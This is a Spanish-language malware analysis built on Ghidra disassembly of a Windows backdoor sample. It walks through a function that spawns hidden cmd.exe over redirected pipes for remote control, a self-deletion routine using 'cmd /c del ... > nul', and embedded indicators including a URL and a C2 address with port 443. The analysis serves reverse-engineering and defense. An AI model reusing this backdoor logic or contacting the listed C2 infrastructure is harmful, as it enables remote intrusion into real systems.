        0040190c 53              PUSH       EBX                                              LPSECURITY_ATTRIBUTES lpThreadAt
        0040190d 53              PUSH       EBX                                              LPSECURITY_ATTRIBUTES lpProcessA
        0040190e 50              PUSH       EAX                                              LPSTR lpCommandLine for CreatePr
        0040190f 53              PUSH       EBX                                              LPCSTR lpApplicationName for Cre
        00401910 ff 15 30        CALL       dword ptr [->KERNEL32.DLL::CreateProcessA]       = 000023b2
                 20 40 00
        00401916 85 c0           TEST       EAX,EAX
        00401918 74 18           JZ         LAB_00401932
        0040191a 8b 4c 24 1c     MOV        ECX,dword ptr [ESP + 0x1c]
        0040191e 8b 74 24 18     MOV        ESI,dword ptr [ESP + 0x18]
        00401922 51              PUSH       ECX                                              HANDLE hObject for CloseHandle
        00401923 ff 15 00        CALL       dword ptr [->KERNEL32.DLL::CloseHandle]          = 000022e0
                 20 40 00
        00401929 8b c6           MOV        EAX,ESI
        0040192b 5f              POP        EDI
        0040192c 5e              POP        ESI
        0040192d 5b              POP        EBX
        0040192e 83 c4 60        ADD        ESP,0x60
        00401931 c3              RET
                             LAB_00401932                                    XREF[1]:     00401918(j)
        00401932 5f              POP        EDI
        00401933 8b c3           MOV        EAX,EBX
        00401935 5e              POP        ESI
        00401936 5b              POP        EBX
        00401937 83 c4 60        ADD        ESP,0x60
        0040193a c3              RET
        0040193b 90 90 90        align      align(5)
                 90 90
                             **************************************************************
                             * lpStartAddress parameter of CreateThread                   *
                             *                                                            *
                             **************************************************************
                             lpStartAddress_00401940                         XREF[1]:     _StartAddress_004016f0:00401718(
        00401940 81 ec 14 04     LPTHREAD   DAT_0414ec81
        00401944 00              ??         00h
        00401945 00              ??         00h

```

üîπ 1. Preparaci√≥n del stack y registros
```
SUB ESP, 0x60  ; reserva espacio en la pila
MOV EAX, [ESP + param_1]
MOV ESI, [ESP + param_2]
```
Se reciben dos HANDLEs que corresponden a los extremos de los pipes previamente creados (lectura y escritura).


üîπ 2. Duplicaci√≥n de handles
Se llama a DuplicateHandle para duplicar param_2 (uno de los pipes), usando:
```
CALL KERNEL32.DLL::DuplicateHandle
```
Esto permite que el nuevo proceso hijo pueda heredar estos handles y comunicarse por los pipes.

üîπ 3. Copia del comando "cmd.exe"
```
MOV EDI, s_cmd.exe_00403068
SCASB.RE ; Calcula longitud de la cadena
MOVSD / MOVSB ; Copia "cmd.exe" al stack
```

üîπ 4. Preparaci√≥n de las estructuras STARTUPINFOA y PROCESS_INFORMATION
Se preparan con los handles redirigidos para:
- Entrada est√°ndar: desde el malware
- Salida est√°ndar: hacia el malware

üîπ 5. Llamada a CreateProcessA
```
CALL KERNEL32.DLL::CreateProcessA
```
Con:
- lpApplicationName = NULL
- lpCommandLine = "cmd.exe"
- bInheritHandles = TRUE

Esto lanza el int√©rprete de comandos con entrada/salida redirigida.

üîπ 6. Manejo del proceso
Si CreateProcessA funciona:
- Cierra uno de los HANDLEs del proceso hijo (para no tener duplicados).
- Devuelve el HANDLE al proceso lanzado.

Si falla, devuelve NULL.


**Esto permite al malware:**
- Lanzar cmd.exe oculto
- Escribir comandos en √©l
- Leer su salida
- Usarlo como canal de control (C2) o para ejecutar instrucciones del atacante.

------------------------
## Contenido desensamblado de la muestra de malware: .text ‚Üí Funci√≥n FUN_00401b50

```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined4 __stdcall FUN_00401b50(void)
                               assume FS_OFFSET = 0xffdff000
             undefined4        EAX:4          <RETURN>
             undefined1        Stack[-0x30c   local_30c                               XREF[1]:     00401b56(*)
                             FUN_00401b50                                    XREF[3]:     FUN_00401320:00401421(c),
                                                                                          FUN_00401320:004015d0(c),
                                                                                          _StartAddress_004016f0:00401848(
        00401b50 81 ec 48        SUB        ESP,0x348
                 03 00 00
        00401b56 8d 44 24 3c     LEA        EAX=>local_30c,[ESP + 0x3c]
        00401b5a 53              PUSH       EBX
        00401b5b 55              PUSH       EBP
        00401b5c 56              PUSH       ESI
        00401b5d 57              PUSH       EDI
        00401b5e 68 04 01        PUSH       0x104                                            DWORD nSize for GetModuleFileNameA
                 00 00
        00401b63 33 ff           XOR        EDI,EDI
        00401b65 50              PUSH       EAX                                              LPSTR lpFilename for GetModuleFi
        00401b66 57              PUSH       EDI                                              HMODULE hModule for GetModuleFil
        00401b67 ff 15 6c        CALL       dword ptr [->KERNEL32.DLL::GetModuleFileNameA]   = 000024ba
                 20 40 00
        00401b6d 85 c0           TEST       EAX,EAX
        00401b6f 0f 84 2b        JZ         LAB_00401ca0
                 01 00 00
        00401b75 8d 4c 24 4c     LEA        ECX,[ESP + 0x4c]
        00401b79 68 04 01        PUSH       0x104                                            DWORD cchBuffer for GetShortPath
                 00 00
        00401b7e 8d 54 24 50     LEA        EDX,[ESP + 0x50]
        00401b82 51              PUSH       ECX                                              LPSTR lpszShortPath for GetShort
        00401b83 52              PUSH       EDX                                              LPCSTR lpszLongPath for GetShort
        00401b84 ff 15 68        CALL       dword ptr [->KERNEL32.DLL::GetShortPathNameA]    = 000024a6
                 20 40 00
        00401b8a 85 c0           TEST       EAX,EAX
        00401b8c 0f 84 0e        JZ         LAB_00401ca0
                 01 00 00
        00401b92 8d 84 24        LEA        EAX,[ESP + 0x254]
                 54 02 00 00
        00401b99 68 04 01        PUSH       0x104                                            DWORD nSize for GetEnvironmentVa
                 00 00
        00401b9e 50              PUSH       EAX                                              LPSTR lpBuffer for GetEnvironmen
        00401b9f 68 90 30        PUSH       s_COMSPEC_00403090                               LPCSTR lpName for GetEnvironment
                 40 00
        00401ba4 ff 15 64        CALL       dword ptr [->KERNEL32.DLL::GetEnvironmentVaria   = 0000248c
                 20 40 00
        00401baa 85 c0           TEST       EAX,EAX
        00401bac 0f 84 ee        JZ         LAB_00401ca0
                 00 00 00
        00401bb2 8d 8c 24        LEA        ECX,[ESP + 0x150]
                 50 01 00 00
        00401bb9 68 88 30        PUSH       s_/c_del_00403088                                LPCSTR lpString2 for lstrcpyA
                 40 00
        00401bbe 51              PUSH       ECX                                              LPSTR lpString1 for lstrcpyA
        00401bbf ff 15 60        CALL       dword ptr [->KERNEL32.DLL::lstrcpyA]             = 00002480
                 20 40 00
        00401bc5 8b 35 5c        MOV        ESI,dword ptr [->KERNEL32.DLL::lstrcatA]         = 00002474
                 20 40 00
        00401bcb 8d 54 24 4c     LEA        EDX,[ESP + 0x4c]
        00401bcf 8d 84 24        LEA        EAX,[ESP + 0x150]
                 50 01 00 00
        00401bd6 52              PUSH       EDX                                              LPCSTR lpString2 for lstrcatA
        00401bd7 50              PUSH       EAX                                              LPSTR lpString1 for lstrcatA
        00401bd8 ff d6           CALL       ESI=>KERNEL32.DLL::lstrcatA
        00401bda 8d 8c 24        LEA        ECX,[ESP + 0x150]
                 50 01 00 00
        00401be1 68 80 30        PUSH       s_>_nul_00403080                                 LPCSTR lpString2 for lstrcatA
                 40 00
        00401be6 51              PUSH       ECX                                              LPSTR lpString1 for lstrcatA
        00401be7 ff d6           CALL       ESI=>KERNEL32.DLL::lstrcatA
        00401be9 89 7c 24 18     MOV        dword ptr [ESP + 0x18],EDI
        00401bed 8d 94 24        LEA        EDX,[ESP + 0x254]
                 54 02 00 00
        00401bf4 8d 84 24        LEA        EAX,[ESP + 0x150]
                 50 01 00 00
        00401bfb 89 7c 24 28     MOV        dword ptr [ESP + 0x28],EDI
        00401bff 89 7c 24 2c     MOV        dword ptr [ESP + 0x2c],EDI
        00401c03 8b 3d 38        MOV        EDI,dword ptr [->KERNEL32.DLL::GetCurrentProce   = 000023d6
                 20 40 00
        ...
        ....
```

Esta funci√≥n llama a GetModuleFileNameA para obtener el path completo del ejecutable actual.
Despu√©s, recorre el string desde el final buscando el √∫ltimo '\\' para extraer el nombre del archivo.

------------------------
## Contenido .rdata

La secci√≥n .rdata (Read-Only Data) de un ejecutable PE (Portable Executable) en Windows contiene datos de solo lectura que el programa necesita en tiempo de ejecuci√≥n. En tu muestra de malware, lo m√°s habitual es que incluya:

üì¶ Contenido t√≠pico de .rdata
- Tipo de dato	Descripci√≥n
- Cadenas de texto	Mensajes de error, comandos ("cmd.exe"), rutas, etc.
- Tablas de importaci√≥n (IAT)	Direcciones de funciones importadas, como LoadLibraryA, GetProcAddress, etc.
- Identificadores de recursos	Como cadenas de recursos, versiones, etc.
- Tablas de RTTI (C++)	Informaci√≥n para tipo de datos en C++ (si est√° compilado as√≠)
- Datos est√°ticos no modificables	Arrays constantes, estructuras inmutables


------------------------

## Contenido .data
- Variables globales	Datos que pueden cambiar en tiempo de ejecuci√≥n. Por ejemplo, contadores, flags, estructuras, punteros, etc.
- Punteros a funciones o estructuras	Usados internamente por el programa.
- Datos inicializados	Cualquier dato est√°tico (no constante) que necesita un valor inicial y puede modificarse luego.
- NO contiene c√≥digo	Aunque a veces puede haber ofuscaci√≥n, normalmente no hay instrucciones de CPU aqu√≠.

```
                             //
                             // .data
                             // ram:00403000-ram:00403627
                             //
                             DAT_00403000                                    XREF[2]:     00400234(*), entry:00401d9a(*)
        00403000 00              ??         00h
        00403001 00              ??         00h
        00403002 00              ??         00h
        00403003 00              ??         00h
                             DAT_00403004                                    XREF[1]:     entry:00401d95(*)
        00403004 00              ??         00h
        00403005 00              ??         00h
        00403006 00              ??         00h
        00403007 00              ??         00h
                             DAT_00403008                                    XREF[1]:     entry:00401d67(*)
        00403008 00              ??         00h
        00403009 00              ??         00h
        0040300a 00              ??         00h
        0040300b 00              ??         00h
                             DAT_0040300c                                    XREF[1]:     entry:00401d62(*)
        0040300c 00              ??         00h
        0040300d 00              ??         00h
        0040300e 00              ??         00h
        0040300f 00              ??         00h
        00403010 1c              ??         1Ch                                              ?  ->  0040301c
        00403011 30              ??         30h    0
        00403012 40              ??         40h    @
        00403013 00              ??         00h
        00403014 11              ??         11h
        00403015 3a              ??         3Ah    :
        00403016 6d              ??         6Dh    m
        00403017 d2              ??         D2h
        00403018 27              ??         27h    '
        00403019 e9              ??         E9h
        0040301a b9              ??         B9h
        0040301b 31 68 74        ds         "1http://www.ueopen.com/test.html"
                 74 70 3a
                 2f 2f 77
        0040303c 00              ??         00h
        0040303d 00              ??         00h
        0040303e 00              ??         00h
        0040303f 00              ??         00h
                             **************************************************************
                             * _Str2 parameter of _strnicmp                               *
                             *                                                            *
                             **************************************************************
                             s_*(SY)#_cmd_00403040                           XREF[1]:     FUN_00401320:00401598(*)
        00403040 2a 28 53        ds         "*(SY)# cmd"
                 59 29 23
                 20 63 6d
        0040304b 00              ??         00h
                             **************************************************************
                             * _Str2 parameter of _strnicmp                               *
                             *                                                            *
                             **************************************************************
                             s_*(SY)#_0040304c                               XREF[1]:     FUN_00401320:00401580(*)
        0040304c 2a 28 53        ds         "*(SY)#"
                 59 29 23 00
        00403053 00              ??         00h
                             **************************************************************
                             * _Format parameter of sprintf                               *
                             *                                                            *
                             **************************************************************
                             s_send_=_%d_00403054                            XREF[2]:     FUN_00401320:00401521(*),
                                                                                          FUN_00401320:00401531(*)
        00403054 73 65 6e        ds         "send = %d"
                 64 20 3d
                 20 25 64 00
        0040305e 00              ??         00h
        0040305f 00              ??         00h
                             s_*(SY)#_00403060                               XREF[4]:     FUN_00401320:00401491(*),
                                                                                          FUN_00401320:0040149c(R),
                                                                                          FUN_00401320:004014af(R),
                                                                                          FUN_00401320:004014b8(R)
        00403060 2a 28 53        ds         "*(SY)# "
                 59 29 23
                 20 00
                             s_cmd.exe_00403068                              XREF[1]:     FUN_00401860:004018d3(*)
        00403068 63 6d 64        ds         "cmd.exe"
                 2e 65 78
                 65 00
        00403070 65              ??         65h    e
        00403071 78              ??         78h    x
        00403072 69              ??         69h    i
        00403073 74              ??         74h    t
        00403074 0d              ??         0Dh
        00403075 0a              ??         0Ah
        00403076 00              ??         00h
        00403077 00              ??         00h
                             DAT_00403078                                    XREF[1]:     FUN_00401b50:00401c16(*)
        00403078 4f              ??         4Fh    O
        00403079 70              ??         70h    p
        0040307a 65              ??         65h    e
        0040307b 6e              ??         6Eh    n
        0040307c 00              ??         00h
        0040307d 00              ??         00h
        0040307e 00              ??         00h
        0040307f 00              ??         00h
                             **************************************************************
                             * lpString2 parameter of lstrcatA                            *
                             *                                                            *
                             **************************************************************
                             s_>_nul_00403080                                XREF[1]:     FUN_00401b50:00401be1(*)
        00403080 20 3e 20        ds         " > nul"
                 6e 75 6c 00
        00403087 00              ??         00h
                             **************************************************************
                             * lpString2 parameter of lstrcpyA                            *
                             *                                                            *
                             **************************************************************
                             s_/c_del_00403088                               XREF[1]:     FUN_00401b50:00401bb9(*)
        00403088 2f 63 20        ds         "/c del "
                 64 65 6c
                 20 00
                             **************************************************************
                             * lpName parameter of GetEnvironmentVariableA                *
                             *                                                            *
                             **************************************************************
                             s_COMSPEC_00403090                              XREF[1]:     FUN_00401b50:00401b9f(*)
        00403090 43 4f 4d        ds         "COMSPEC"
                 53 50 45
                 43 00
                             DAT_00403098                                    XREF[1]:     entry:00401d49(R)
        00403098 01 00 00 00     undefined4 00000001h
        0040309c 00              ??         00h
        0040309d 00              ??         00h
        0040309e 00              ??         00h
        0040309f 00              ??         00h
                             **************************************************************
                             * lpBuffer parameter of LoadStringA                          *
                             *                                                            *
                             * _Str parameter of strchr                                   *
                             *                                                            *
                             **************************************************************
                             _Str_004030a0+1                                 XREF[9,1]:   FUN_00401240:00401249(*),
                             lpBuffer_004030a0                                            FUN_00401240:00401257(*),
                             _Str_004030a0                                                FUN_00401320:0040132c(*),
                                                                                          FUN_00401320:0040133a(*),
                                                                                          FUN_00401320:00401353(*),
                                                                                          FUN_00401320:00401361(R),
                                                                                          FUN_00401320:00401368(R),
                                                                                          FUN_00401320:0040136e(*),
                                                                                          FUN_00401320:0040138c(*),
                                                                                          FUN_00401320:00401385(*)
        004030a0 00 00 00 00     LPSTR      00000000
        004030a4 00              ??         00h
        004030a5 00              ??         00h
        ....
        ....
               00 00 e4
                             Rsrc_StringTable_1_409
        00404058 00 00           p_unicode  u""                                              Rsrc String ID 0
        0040405a 10 00 36        p_unicode  u"60.248.52.95:443"                              Rsrc String ID 1
                 00 30 00
                 2e 00 32
        0040407c 50              ??         50h    P                                         Rsrc String ID 2
        0040407d 41              ??         41h    A                                         Rsrc String ID 3
        0040407e 44              ??         44h    D                                         Rsrc String ID 4
        0040407f 44              ??         44h    D                                         Rsrc String ID 5
   
```

üîπ 1. Variables no inicializadas / buffers: Estas zonas inicializadas con 00h probablemente se usan como variables globales o buffers durante la ejecuci√≥n:

| Direcci√≥n |	Nombre en Ghidra |	Descripci√≥n estimada |
| -- | -- | -- |
| 00403000 | DAT_00403000 | Usado por la funci√≥n entry en 00401d9a. Posible puntero |
| 00403004 | DAT_00403004 | Tambi√©n referenciado en entry |
| 00403008 | DAT_00403008 | Referenciado al inicio del programa |
| 0040300c | DAT_0040300c | Usado al arrancar |
| 004030a0 | _Str_004030a0 | Buffer para LoadStringA, modificado din√°micamente |


üîπ 2. Strings embebidas (inmutables por el binario, pero accesibles en .data). Estas cadenas son clave para entender el comportamiento del malware.

| Direcci√≥n | Contenido | Uso o prop√≥sito detectado
| -- | -- | -- |
| 0040301b | "http://www.ueopen.com/test.html" | URL posiblemente usada para C2, descarga o beaconing. |
| 00403040 | "*(SY)# cmd" | Parte de un patr√≥n de comando para comparaci√≥n. |
| 0040304c | "*(SY)#" | Variante reducida del anterior. |
| 00403054 | "send = %d" | Para formatear salidas, probablemente debug/red. |
| 00403060 | "*(SY)# " | Se repite mucho en la funci√≥n FUN_00401320. Podr√≠a ser firma para comandos. |
| 00403068 | "cmd.exe" | Comando usado para lanzar shells. |
| 00403080 | " > nul" | Redirecci√≥n para evitar salida visible. |
| 00403088 | "/c del " | Indica intento de auto-eliminaci√≥n (cmd /c del). |
| 00403090 | "COMSPEC" | Nombre de variable de entorno (para encontrar cmd.exe). |
| 00404058 | "" | Cadena vac√≠a |
| 0040405A | "60.248.52.95:443" | IP y puerto sospechoso, t√≠pico de direcci√≥n C2 (Command & Control) |



üîπ 3. Variables concretas y sus usos conocidos
| Direcci√≥n | 	Nombre en Ghidra | 	Uso |
| -- | -- | -- |
| 00403098 | 	DAT_00403098 | 	0x01. Valor de control usado en entry. |
| 004030d4 | 	DAT_004030d4 | 	Guarda el handle de un evento creado por CreateEventA. |
| 004030d8 | 	DAT_004030d8 | 	Segundo evento. Tambi√©n usado en sincronizaci√≥n (WaitForSingleObject). |
| 004030e0 | 	DAT_004030e0 | 	Buffer de 0x4B DWORDs, puesto a 0 con STOSD, probablemente como array de control. |


Carga din√°mica y ejecuci√≥n de comandos: Las cadenas cmd.exe, /c del, COMSPEC, etc. indican que lanzar√° comandos de sistema, posiblemente para:
- Descargar o eliminarse.
- Ejecutar comandos remotos.

Cadenas de red: "http://www.ueopen.com/test.html" podr√≠a ser una URL de comando y control (C2) o de descarga de payloads adicionales.

Autoeliminaci√≥n: El uso de "cmd /c del" y " > nul" es cl√°sico de malware que borra su propio ejecutable tras ejecutarse.

La IP 60.248.52.95:443 apunta a que el malware se conecta a un servidor remoto, probablemente para:
- Enviar datos robados.
- Descargar instrucciones.
- Ejecutar payloads adicionales.

Puerto 443 (HTTPS): uso com√∫n para evitar firewalls o IDS/IPS, ya que muchas conexiones leg√≠timas usan ese puerto.


------------------------

üéØ ¬øQu√© papel cumple esta funci√≥n en el malware?
| Comportamiento |	Posible funci√≥n en el malware |
| --| -- |
| Crear eventos	| Sincronizaci√≥n entre hilos o fases del malware |
| Borrar buffer con REP STOSD	| Limpiar memoria para evitar dejar rastros |
| Llamar a otra funci√≥n y esperar	| Ejecutar rutina secundaria (desempaquetar, inyectar...) y pausar hasta que finalice |
| Esperar y cerrar el evento	| Comportamiento ordenado tras ejecuci√≥n controlada |
